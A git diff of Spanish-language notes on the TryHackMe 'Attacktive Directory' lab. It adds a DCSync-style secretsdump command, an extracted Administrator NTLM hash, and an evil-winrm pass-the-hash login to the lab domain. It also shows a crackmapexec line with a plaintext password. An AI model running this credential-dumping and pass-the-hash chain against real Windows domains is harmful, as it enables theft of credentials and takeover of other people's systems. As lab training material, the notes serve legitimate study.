@@ -1,3 +1,4 @@
+https://tryhackme.com/r/room/attacktivedirectory
 # Fase de reconocimiento
 Windows
 ## Buscamos puertos abiertos
@@ -67,10 +68,19 @@ crackmapexec smb spookysec.local -u 'backup' -p 'backup2517860'
 ![[Pasted image 20240605230804.png]]
 ## PassTheHash
 El usuario backup tiene permiso para sacar los hashes
+```
+impacket-secretsdump -just-dc backup@spookysec.local
+```
 ![[Pasted image 20240605230904.png]]
 Copiamos el NTHash
+```
+0e0363213e37b94221497260b0bcb4fc
+```
+Comprobamos
+![[Pasted image 20240607193036.png]]
 Nos conectamos con el hash
 ```
 evil-winrm -ip spookysec.local -u 'Administrator' -H 0e0363213e37b94221497260b0bcb4fc
 ```
+[+] ==pwned!==
 
